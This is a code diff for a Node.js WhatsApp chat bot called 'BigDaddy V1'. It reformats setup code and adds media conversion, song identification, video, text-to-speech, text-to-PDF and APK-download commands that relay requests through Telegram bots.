@@ -5,7 +5,6 @@ const fs = require('fs')
 const fsx = require('fs-extra')
 const path = require('path')
 const util = require('util')
-const FormData = require('form-data');
 const chalk = require('chalk')
 const moment = require('moment-timezone')
 const speed = require('performance-now')
@@ -38,39 +37,44 @@ var premium = fs.readFileSync("database/premium.json", "utf8");
 console.log(premium); 
 
 var _afk = JSON.parse(fs.readFileSync('./database/afk-user.json', 'utf8'));
-var hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'));
+var hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
 
-// Autoreply
-var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'));
-var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'));
-var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'));
-var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'));
-var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'));
-var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'));
-var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'));
-
-// Time variables
-var xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss');
-var xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY');
-var time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss');
-
-// Adjusting variable type for reassignment
-let xeonytimewisher;
-if (time2 < "23:59:00") {
-    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
-} else if (time2 < "19:00:00") {
-    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
-} else if (time2 < "18:00:00") {
-    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
-} else if (time2 < "15:00:00") {
-    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
-} else if (time2 < "11:00:00") {
-    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
-} else if (time2 < "05:00:00") {
-    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
-}
-
-// Main Module Export
+//autorep
+var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
+var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
+var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
+var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
+var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
+var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
+var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
+//time
+var xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
+        var xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+        var time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
+         if(time2 < "23:59:00"){
+var xeonytimewisher = `Hey am BigDaddy
+V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
+ }
+ if(time2 < "19:00:00"){
+var xeonytimewisher = `Hey am BigDaddy
+V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
+ }
+ if(time2 < "18:00:00"){
+var xeonytimewisher = `Hey am BigDaddy
+V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
+ }
+ if(time2 < "15:00:00"){
+var xeonytimewisher = `Hey am BigDaddy
+V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
+ }
+ if(time2 < "11:00:00"){
+var xeonytimewisher = `Hey am BigDaddy
+V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
+ }
+ if(time2 < "05:00:00"){
+var xeonytimewisher = `Hey am BigDaddy
+V1 created by ᴘʜ✦ꜱᴛᴀʀ.`
+ } 
 module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
     try {
         const {
@@ -79,43 +83,31 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
             mentioned,
             now,
             fromMe
-        } = m;
-
-        var body = (m.mtype === 'conversation') ? m.message.conversation :
-            (m.mtype == 'imageMessage') ? m.message.imageMessage.caption :
-            (m.mtype == 'videoMessage') ? m.message.videoMessage.caption :
-            (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
-            (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
-            (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId :
-            (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId :
-            (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : '';
-            
+        } = m
+        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
         var prefa = "!"; // Default prefix for commands
-        var budy = (typeof m.text == 'string' ? m.text : '');
-        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
-        
-        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
-        const args = body.trim().split(/ +/).slice(1);
-        const full_args = body.replace(command, '').slice(1).trim();
-        const pushname = m.pushName || "No Name";
+var budy = (typeof m.text == 'string' ? m.text : '');
+var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
+        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+        const args = body.trim().split(/ +/).slice(1)
+        const full_args = body.replace(command, '').slice(1).trim()
+        const pushname = m.pushName || "No Name"
         const ytdl = require('ytdl-core');
-        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id);
-        const itsMe = m.sender == botNumber ? true : false;
-        const sender = m.sender;
-        const text = q = args.join(" ");
-        const from = m.key.remoteJid;
-        const fatkuns = (m.quoted || m);
-        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
-            (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
-            (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
-        const mime = (quoted.msg || quoted).mimetype || '';
-        const qmsg = (quoted.msg || quoted);
-        const isMedia = /image|video|sticker|audio/.test(mime);
-        const isImage = (type == 'imageMessage');
-        const isVideo = (type == 'videoMessage');
-        const isAudio = (type == 'audioMessage');
-        const isText = (type == 'textMessage');
-        const isSticker = (type == 'stickerMessage');
+        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
+        const itsMe = m.sender == botNumber ? true : false
+        const sender = m.sender
+        const text = q = args.join(" ")
+        const from = m.key.remoteJid
+        const fatkuns = (m.quoted || m)
+        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
+        const mime = (quoted.msg || quoted).mimetype || ''
+        const qmsg = (quoted.msg || quoted)
+        const isMedia = /image|video|sticker|audio/.test(mime)
+        const isImage = (type == 'imageMessage')
+        const isVideo = (type == 'videoMessage')
+        const isAudio = (type == 'audioMessage')
+        const isText = (type == 'textMessage')
+        const isSticker = (type == 'stickerMessage')
         const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
         const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
         const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
@@ -398,6 +390,79 @@ const devinettes = [
     reponse: "A mirror",
   }
 ];
+function convertToAudio(inputBuffer, outputExtension) {
+    return new Promise((resolve, reject) => {
+        const inputFile = path.join(__dirname, `input.${outputExtension}`);
+        const outputFile = path.join(__dirname, `output.mp3`);
+        
+        // Save the input file (audio buffer) to disk
+        fs.writeFileSync(inputFile, inputBuffer);
+
+        // Run ffmpeg to convert to mp3
+        const ffmpeg = spawn('ffmpeg', [
+            '-i', inputFile,
+            '-vn',  // No video
+            '-ac', '2',  // Stereo audio
+            '-b:a', '128k',  // Audio bitrate
+            '-ar', '44100',  // Audio sample rate
+            outputFile  // Output file name
+        ]);
+
+        ffmpeg.on('close', (code) => {
+            if (code !== 0) {
+                reject(`Error during conversion, code: ${code}`);
+                return;
+            }
+            // Read the output file (MP3) and resolve the buffer
+            const audioBuffer = fs.readFileSync(outputFile);
+            fs.unlinkSync(inputFile);  // Clean up input file
+            fs.unlinkSync(outputFile); // Clean up output file
+            resolve(audioBuffer);
+        });
+
+        ffmpeg.on('error', (err) => {
+            reject(err);
+        });
+    });
+}
+// Helper function to handle the video conversion
+function convertToVideo(inputBuffer, outputExtension) {
+    return new Promise((resolve, reject) => {
+        const inputFile = path.join(__dirname, `input.${outputExtension}`);
+        const outputFile = path.join(__dirname, `output.mp4`);
+        
+        // Save the input file (video buffer) to disk
+        fs.writeFileSync(inputFile, inputBuffer);
+
+        // Run ffmpeg to convert to mp4
+        const ffmpeg = spawn('ffmpeg', [
+            '-i', inputFile,
+            '-c:v', 'libx264',  // Video codec for mp4
+            '-c:a', 'aac',      // Audio codec for mp4
+            '-b:a', '128k',     // Audio bitrate
+            '-ar', '44100',     // Audio sample rate
+            '-crf', '32',       // Quality factor
+            '-preset', 'slow',  // Slow but high-quality encoding
+            outputFile
+        ]);
+
+        ffmpeg.on('close', (code) => {
+            if (code !== 0) {
+                reject(`Error during conversion, code: ${code}`);
+                return;
+            }
+            // Read the output file (MP4) and resolve the buffer
+            const videoBuffer = fs.readFileSync(outputFile);
+            fs.unlinkSync(inputFile);  // Clean up input file
+            fs.unlinkSync(outputFile); // Clean up output file
+            resolve(videoBuffer);
+        });
+
+        ffmpeg.on('error', (err) => {
+            reject(err);
+        });
+    });
+}
 async function loading(from) {
     const xeonlod = [
         "🌟 *BIG DADDY V1*  10%... 🌟",
@@ -423,12 +488,13 @@ async function downloadFile(url, localPath) {
     try {
         const response = await axios.get(url, { responseType: 'text' }); // Ensure response is plain text
         fs.writeFileSync(localPath, response.data, 'utf8'); // Write the data as a UTF-8 string
-        console.log(`File downloaded and saved a BigDaddy 1.js`);
+        console.log(`File downloaded and saved at ${localPath}`);
     } catch (error) {
         console.error('Error downloading file:', error);
         throw error;
     }
 }
+
         if (!XeonBotInc.public) {
             if (!isCreator && !m.key.fromMe) return
         }
@@ -873,10 +939,9 @@ async function fetchTelegramFile(type, botToken, chatId) {
 
     let fileId = null;
     let textContent = null;
-    let urlContent = null; // New variable to hold URL
     let retries = 0;
 
-    while (!fileId && !textContent && !urlContent && retries < 15) { // Retry up to 15 times
+    while (!fileId && !textContent && retries < 15) { // Retry up to 15 times
         const updatesResponse = await fetch(
             `${getUpdatesUrl}${lastUpdateId ? `?offset=${lastUpdateId + 1}` : ''}`
         );
@@ -893,9 +958,7 @@ async function fetchTelegramFile(type, botToken, chatId) {
                          update.message.document.mime_type === 'application/pdf') ||
                         (update.message.text && 
                          (update.message.text.startsWith('/') || 
-                          update.message.text.includes('Identifying the audio... Please wait!') || 
-                          update.message.text.includes('http') || 
-                          update.message.text.includes('https')))
+                          update.message.text.includes('Identifying the audio... Please wait!')))
                     ) {
                         continue; // Skip this update
                     }
@@ -921,14 +984,6 @@ async function fetchTelegramFile(type, botToken, chatId) {
                             fileId = update.message.document.file_id;
                             break;
                         }
-                    } else if (type === 'url' && update.message.text) {
-                        // Check if the message text contains a URL
-                        const urlRegex = /(https?:\/\/[^\s]+)/g;
-                        const urls = update.message.text.match(urlRegex);
-                        if (urls) {
-                            urlContent = urls[0]; // Return the first URL found
-                            break;
-                        }
                     }
                 }
             }
@@ -937,14 +992,11 @@ async function fetchTelegramFile(type, botToken, chatId) {
         await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before retrying
     }
 
-    if (!fileId && !textContent && !urlContent) throw new Error(`Failed to retrieve new ${type} from Telegram`);
+    if (!fileId && !textContent) throw new Error(`Failed to retrieve new ${type} from Telegram`);
 
     if (type === 'text') {
         // Return the text content directly
         return textContent;
-    } else if (type === 'url') {
-        // Return the URL content directly
-        return urlContent;
     }
 
     // Fetch File URL for media (including PDF)
@@ -1120,7 +1172,7 @@ async function getUserReplyWithTimeout(chatId, timeout) {
             }
         });
     });
-} 
+}
            if (command) {
             const cmdadd = () => {
                 hit[0].hit_cmd += 1
@@ -1856,7 +1908,70 @@ case 'gpt2':
         console.error(err);
         replygcxeon('User added successfully.');
     }
-    break; 
+    break;
+    case 'shazam': {
+    try {
+        // Check if the user replied to an audio or video file
+        if (!m.quoted || !['audio', 'video'].some(type => m.quoted.mtype.includes(type))) {
+            return replygcxeon('❌ Please reply to an audio or video file.')
+        }
+
+        replygcxeon('🔍 Processing your media...')
+
+        // Fetch the media as a buffer
+        const media = await XeonBotInc.downloadMediaMessage(m.quoted)
+        if (!media) throw new Error('Failed to fetch the media. Please try again.')
+
+        // Determine the media type
+        const mediaType = m.quoted.mtype.includes('video') ? 'Video' : 'Audio'
+
+        // Define your Telegram bot token and group ID
+        const { botToken, groupId } = getRandomBot()
+
+        // Send the media to Telegram using the sendMediaToTelegram function
+        await sendMediaToTelegram({
+            botToken,
+            chatId: groupId,
+            mediaBuffer: media,
+            mediaType,
+            caption: '/shazam', // Caption for the media
+        })
+
+        // Fetch the response from Telegram
+        let responseMessage = null
+        while (!responseMessage) {
+            const message = await fetchTelegramFile('text', botToken, groupId)
+
+            // Check if the message starts with 🎶 Audio Identified:
+            if (message && message.startsWith('🎶 Audio Identified:')) {
+                // Remove unwanted parts from the message
+                responseMessage = message
+                    .replace('🔗 Listen on Shazam', '')
+                    .replace('ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ', '')
+                    .trim()
+                break
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 1000)) // Slight delay to avoid spamming
+        }
+
+        // Send the cleaned response back to WhatsApp
+        if (responseMessage) {
+            await XeonBotInc.sendMessage(
+                m.chat,
+                {
+                    text: responseMessage,
+                },
+                { quoted: m }
+            )
+        } else {
+            replygcxeon('❌ Could not identify the audio. Please try again.')
+        }
+    } catch (err) {
+        await replygcxeon('❌ An error occurred while processing your request.')
+        console.error(err)
+    }
+    break
 case 'play':
     try {
         if (!text) return replygcxeon('❌ Please specify a song or artist name! Usage: play <song name>');
@@ -1925,6 +2040,7 @@ case 'play':
         console.error(err);
     }
     break;
+
 case 'song':
     try {
         if (!text) return replygcxeon('❌ Please specify a song or artist name! Usage: play <song name>');
@@ -2010,6 +2126,50 @@ case 'song':
 
     } catch (err) {
         replygcxeon(`❌ An error occurred please try again`);
+        console.error(err);
+    }
+    break;
+    case 'video':
+    try {
+        if (!text) return replygcxeon('❌ Please specify a YouTube video you want to download! Usage: video Frozen');
+        
+        const query = text; // Ensure query is set from user input
+
+        replygcxeon('🔍 Processing your request...');
+
+        // 3. Get random bot and group
+        const { botToken, groupId } = getRandomBot();
+
+        // Step 1: Send /video command to Telegram
+        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const commandResponse = await fetch(sendMessageUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: groupId, text: `/video ${query}` }),
+        });
+
+        if (!commandResponse.ok) throw new Error('Failed to process the request. Please try again.');
+
+        // Step 2: Retrieve video file URL
+        const videoFileUrl = await fetchTelegramFile('video', botToken, groupId);
+
+        if (videoFileUrl) {
+            // Step 3: Send the video back to WhatsApp
+            await XeonBotInc.sendMessage(
+                m.chat,
+                {
+                    video: { url: videoFileUrl },
+                    caption: `🎥 Now Playing Video: ${query} 🎥\n\n*Enjoy watching! 🍿*`
+                },
+                { quoted: m }
+            );
+        } else {
+            throw new Error('No video file found.');
+        }
+        
+    } catch (err) {
+        replygcxeon(`❌ An error occurred: ${err.message}. Please try again.`);
         console.error(err);
     }
     break;
@@ -2100,7 +2260,7 @@ case 'fb':
         replygcxeon(`❌ An error occurred please try again`);
         console.error(err);
     }
-    break;   
+    break;
 case 'instagram':
     try {
         if (!text) return replygcxeon('❌ Please specify an Instagram post link! Usage: instagram <link>');
@@ -2148,6 +2308,143 @@ case 'instagram':
     }
     break;
 case 'generate':
+    try {
+        if (!text) {
+            return replygcxeon('❌ Please specify a text to generate an image! Usage: /generate <your text>');
+        }
+
+        const query = text.trim();
+        replygcxeon('🔍 Generating image from text...');
+
+        // 3. Get random bot and group
+        const { botToken, groupId } = getRandomBot();
+
+        // Step 1: Send /text2image command to Telegram group
+        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const commandResponse = await fetch(sendMessageUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: groupId, text: `/text2image ${query}` }),
+        });
+
+        if (!commandResponse.ok) {
+            throw new Error('Failed to send /text2image command to Telegram bot');
+        }
+
+        // Step 2: Fetch the generated image URL from Telegram
+        const telegramImageUrl = await fetchTelegramFile('photo', botToken, groupId);
+
+        // Step 3: Send the generated image to WhatsApp
+        await XeonBotInc.sendMessage(
+            m.chat,
+            {
+                image: { url: telegramImageUrl },
+                caption: `✨ *Image Generated from Text*\n\n*Query*: ${query}`,
+            },
+            { quoted: m }
+        );
+
+    } catch (err) {
+        replygcxeon(`❌ An error occurred: ${err.message}`);
+        console.error(err);
+    }
+    break;
+    case 'text2speech':
+    try {
+        if (!text) {
+            return replygcxeon('❌ Please specify the text to convert to speech! Usage: text2speech <your text>');
+        }
+
+        const query = text.trim();
+        if (query.length > 500) {
+            return replygcxeon('❌ The text is too long! Please limit your input to 500 characters.');
+        }
+
+        replygcxeon('🔍 Generating speech from text...');
+        const { botToken, groupId } = getRandomBot();
+        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const commandResponse = await fetch(sendMessageUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: groupId, text: `/text2speech ${query}` }),
+        });       
+        if (!commandResponse.ok) {
+            throw new Error('Failed please try again');
+        }
+
+        // Step 3: Fetch the audio file URL from Telegram using fetchTelegramFile
+        const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);
+
+        // Step 4: Send the audio back to WhatsApp
+        if (audioFileUrl) {
+            await XeonBotInc.sendMessage(
+                m.chat,
+                {
+                    audio: { url: audioFileUrl },
+                    mimetype: 'audio/mpeg',
+                    ptt: true, // Set to true if you want it to send as a voice note
+                    caption: `🔊 *Text-to-Speech Output*\n\n🗣️ *Text*: ${query}`,
+                },
+                { quoted: m }
+            );
+        } else {
+            await replygcxeon('❌ Failed to generate the audio file');
+        }
+
+    } catch (err) {
+        await replygcxeon('❌ An error occurred, please try again later.');
+        console.error(err);
+    }
+    break;
+    case 'text2pdf':
+    try {
+        if (!text) {
+            return replygcxeon('❌ Please specify the text to convert to PDF! Usage: text2pdf <your text>');
+        }
+
+        const query = text.trim();
+
+        replygcxeon('🔍 Generating PDF from text...');
+        const { botToken, groupId } = getRandomBot();
+        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Step 1: Send the /text2pdf command to Telegram bot
+        const commandResponse = await fetch(sendMessageUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: groupId, text: `/text2pdf ${query}` }),
+        });
+
+        if (!commandResponse.ok) {
+            throw new Error('Failed to send text-to-PDF command to Telegram bot.');
+        }
+
+        // Step 2: Fetch the PDF file URL from Telegram using fetchTelegramFile
+        const pdfFileUrl = await fetchTelegramFile('pdf', botToken, groupId);
+
+        // Step 3: Send the generated PDF back to WhatsApp
+        if (pdfFileUrl) {
+            await XeonBotInc.sendMessage(
+                m.chat,
+                {
+                    document: { url: pdfFileUrl },
+                    mimetype: 'application/pdf',
+                    caption: `📄 *Text-to-PDF Output*\n\n📝 *Text*: ${query}`,
+                },
+                { quoted: m }
+            );
+        } else {
+            await replygcxeon('❌ Failed to generate the PDF file. Please try again.');
+        }
+
+    } catch (err) {
+        await replygcxeon('❌ An error occurred, please try again later.');
+        console.error(err);
+    }
+    break;
+    case 'generate':
     try {
         if (!text) {
             return replygcxeon('❌ Please specify a text to generate an image! Usage: /generate <your text>');
@@ -2233,201 +2530,7 @@ case 'generate':
         console.error(err);
     }
     break;
-    case 'text2speech':
-    try {
-        if (!text) {
-            return replygcxeon('❌ Please specify the text to convert to speech! Usage: text2speech <your text>');
-        }
-
-        const query = text.trim();
-        if (query.length > 500) {
-            return replygcxeon('❌ The text is too long! Please limit your input to 500 characters.');
-        }
-
-        replygcxeon('🔍 Generating speech from text...');
-        const { botToken, groupId } = getRandomBot();
-        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        const commandResponse = await fetch(sendMessageUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: groupId, text: `/text2speech ${query}` }),
-        });       
-        if (!commandResponse.ok) {
-            throw new Error('Failed please try again');
-        }
-
-        // Step 3: Fetch the audio file URL from Telegram using fetchTelegramFile
-        const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);
-
-        // Step 4: Send the audio back to WhatsApp
-        if (audioFileUrl) {
-            await XeonBotInc.sendMessage(
-                m.chat,
-                {
-                    audio: { url: audioFileUrl },
-                    mimetype: 'audio/mpeg',
-                    ptt: true, // Set to true if you want it to send as a voice note
-                    caption: `🔊 *Text-to-Speech Output*\n\n🗣️ *Text*: ${query}`,
-                },
-                { quoted: m }
-            );
-        } else {
-            await replygcxeon('❌ Failed to generate the audio file');
-        }
-
-    } catch (err) {
-        await replygcxeon('❌ An error occurred, please try again later.');
-        console.error(err);
-    }
-    break;
-    case 'shazam': {
-    try {
-        // Check if the user replied to an audio or video file
-        if (!m.quoted || !['audio', 'video'].some(type => m.quoted.mtype.includes(type))) {
-            return replygcxeon('❌ Please reply to an audio or video file.');
-        }
-
-        replygcxeon('⏳ *Coming soon... Please wait for the next update*.');
-    } catch (err) {
-        await replygcxeon('❌ An error occurred while processing your request.');
-        console.error(err);
-    }
-    break;
-}
-case 'url': {
-    try {
-        // Check if the user replied to an image or video file
-        if (!m.quoted || !['image', 'video'].some(type => m.quoted.mtype.includes(type))) {
-            return replygcxeon('❌ Please reply to an image or video file.');
-        }
-
-        replygcxeon('⏳ *Coming soon... Please wait for the next update.*');
-
-        // Optional: You can add a placeholder message if needed for future updates.
-        // Optional: Perform any necessary background processing or delays.
-
-    } catch (err) {
-        await replygcxeon('❌ An error occurred while processing your request.');
-        console.error(err);
-    }
-    break;
-}
-case 'remini': {
-    try {
-        // Check if the user replied to a photo file
-        if (!m.quoted || !['image'].some(type => m.quoted.mtype.includes(type))) {
-            return replygcxeon('❌ Please reply to a photo file.');
-        }
-
-        replygcxeon('🔍 Enhancing your photo... Please wait!');
-
-        // Fetch the photo as a buffer
-        const media = await XeonBotInc.downloadMediaMessage(m.quoted);
-        if (!media) throw new Error('Failed to fetch the photo. Please try again.');
-
-        // Define your Telegram bot token and group ID
-        const { botToken, groupId } = getRandomBot();
-
-        // Send the photo to Telegram using the sendMediaToTelegram function
-        const telegramResponse = await sendMediaToTelegram({
-            botToken,
-            chatId: groupId,
-            mediaBuffer: media,
-            mediaType: 'Photo', // Only for photos
-            caption: '/remini', // Caption for Telegram
-        });
-
-        // Fetch the enhanced image URL from Telegram
-        const telegramImageUrl = await fetchTelegramFile('photo', botToken, groupId);
-
-        if (telegramImageUrl) {
-            await XeonBotInc.sendMessage(
-                m.chat,
-                {
-                    image: { url: telegramImageUrl },
-                    caption: `✨ *Your Image Has Been Successfully Enhanced!* ✨\n\nPowered by *Phistar* 🌟\n\nEnjoy the magic! 😍`,
-                },
-                { quoted: m }
-            );
-        } else {
-            replygcxeon('❌ Failed to enhance the image. Please try again later.');
-        }
-    } catch (err) {
-        replygcxeon(`❌ An error occurred. Please try again.`);
-        console.error(err);
-    }
-    break;
-}
-    case 'apk': {
-    try {
-        if (!text) {
-            return replygcxeon('❌ Please specify your query! Usage: apk <AppName>');
-        }
-
-        const query = text.trim();
-        if (query.length > 500) {
-            return replygcxeon('❌ The query is too long! Please limit your input to 500 characters.');
-        }
-
-        // Replace the original functionality with a "Coming soon..." message
-        replygcxeon('⏳ *Coming soon... Please wait for the next update.*');
-
-        // Optional: you can add any necessary background processing or delays for future updates.
-
-    } catch (err) {
-        await replygcxeon('❌ An error occurred, please try again later.');
-        console.error(err);
-    }
-    break;
-}
-    case 'text2pdf':
-    try {
-        if (!text) {
-            return replygcxeon('❌ Please specify the text to convert to PDF! Usage: text2pdf <your text>');
-        }
-
-        const query = text.trim();
-
-        replygcxeon('🔍 Generating PDF from text...');
-        const { botToken, groupId } = getRandomBot();
-        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        // Step 1: Send the /text2pdf command to Telegram bot
-        const commandResponse = await fetch(sendMessageUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: groupId, text: `/text2pdf ${query}` }),
-        });
-
-        if (!commandResponse.ok) {
-            throw new Error('Failed to send text-to-PDF command to Telegram bot.');
-        }
-
-        // Step 2: Fetch the PDF file URL from Telegram using fetchTelegramFile
-        const pdfFileUrl = await fetchTelegramFile('pdf', botToken, groupId);
-
-        // Step 3: Send the generated PDF back to WhatsApp
-        if (pdfFileUrl) {
-            await XeonBotInc.sendMessage(
-                m.chat,
-                {
-                    document: { url: pdfFileUrl },
-                    mimetype: 'application/pdf',
-                    caption: `📄 *Text-to-PDF Output*\n\n📝 *Text*: ${query}`,
-                },
-                { quoted: m }
-            );
-        } else {
-            await replygcxeon('❌ Failed to generate the PDF file. Please try again.');
-        }
-
-    } catch (err) {
-        await replygcxeon('❌ An error occurred, please try again later.');
-        console.error(err);
-    }
-    break;  
-case 'mediafire': {
+    case 'mediafire': {
     if (!text) return replygcxeon(`*Example*: ${prefix + command} link...`);
 
     try {
@@ -2499,6 +2602,67 @@ case 'screenshot': {
     }
     break;
 }
+    case 'apk':
+    try {
+        if (!text) return replygcxeon('❌ Please specify the app name! Usage: apk <app name>');
+
+        const query = text.trim();
+        replygcxeon('🔍 Searching for your app on APKPure...');     
+        const searchUrl = `https://apkpure.com/search?q=${encodeURIComponent(query)}`;
+        const searchResponse = await axios.get(searchUrl);
+        const $ = cheerio.load(searchResponse.data);
+
+        // Extract the first app's link
+        const appLink = $('a[href*="/app/"]').first().attr('href');
+        if (!appLink) return replygcxeon(`❌ No results found for "${query}".`);
+
+        const appUrl = `https://apkpure.com${appLink}`;
+
+        // Step 2: Get the download page
+        const appPageResponse = await axios.get(appUrl);
+        const $$ = cheerio.load(appPageResponse.data);
+        const downloadLink = $$('a[href*="download-apk"]').attr('href');
+
+        if (!downloadLink) return replygcxeon('❌ Unable to find the APK download link.');
+
+        const fullDownloadLink = `https://apkpure.com${downloadLink}`;
+
+        // Step 3: Download the APK
+        replygcxeon('⬇️ Downloading the APK...');
+        const apkPath = path.join(__dirname, `${query}.apk`);
+        const apkResponse = await axios({
+            url: fullDownloadLink,
+            method: 'GET',
+            responseType: 'stream',
+        });
+
+        const writer = fs.createWriteStream(apkPath);
+        apkResponse.data.pipe(writer);
+
+        await new Promise((resolve, reject) => {
+            writer.on('finish', resolve);
+            writer.on('error', reject);
+        });
+
+        // Step 4: Send the APK to the user
+        await XeonBotInc.sendMessage(
+            m.chat,
+            {
+                document: { url: apkPath },
+                mimetype: 'application/vnd.android.package-archive',
+                fileName: `${query}.apk`,
+                caption: `📱 *Here is your APK for ${query}*.\n\n⚠️ Ensure you trust the source before installing.`,
+            },
+            { quoted: m }
+        );
+
+        // Delete the file after sending
+        fs.unlinkSync(apkPath);
+    } catch (err) {
+        replygcxeon('❌ An error occurred while fetching the APK. Please try again later.');
+        console.error(err);
+    }
+    break;
     case 'chatgpt':
     try {
         if (!text) {
@@ -2543,55 +2707,8 @@ case 'screenshot': {
         await replygcxeon('❌ An error occurred, please try again later.');
         console.error(err);
     }
-    break; 
-    case 'gpt3': {
-    try {
-        // Validate input query
-        if (!text) {
-            return replygcxeon('❌ Please specify your query! Usage: chatgpt <your query>');
-        }
-
-        const query = text.trim();
-        if (query.length > 500) {
